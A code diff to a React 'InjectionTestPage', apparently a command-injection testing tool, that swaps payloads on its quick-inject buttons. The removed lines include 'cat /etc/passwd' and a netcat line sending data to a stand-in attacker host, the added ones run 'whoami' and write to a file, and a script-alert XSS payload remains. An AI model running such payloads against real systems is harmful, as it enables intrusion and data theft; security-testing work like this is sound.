@@ -134,12 +134,12 @@ export default function InjectionTestPage() {
              <span className="w-1.5 h-1.5 bg-primary rotate-45"></span> Exploit Arsenal
           </p>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-3 w-full opacity-80 text-xs font-mono text-primary/70">
-            <button type="button" onClick={() => handleQuickInject('ping 8.8.8.8 && cat /etc/passwd')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
-              <span><code>ping && cat /etc/passwd</code></span>
+            <button type="button" onClick={() => handleQuickInject('ping 127.0.0.1 && whoami')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
+              <span><code>ping && whoami</code></span>
               <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
             </button>
-            <button type="button" onClick={() => handleQuickInject('echo test | nc attacker.com 4444')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
-              <span><code>echo | nc attacker.com</code></span>
+            <button type="button" onClick={() => handleQuickInject('echo Hack >> output.txt | dir')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
+              <span><code>echo | dir</code></span>
               <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
             </button>
             <button type="button" onClick={() => handleQuickInject('<script>alert("hacked")</script>')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
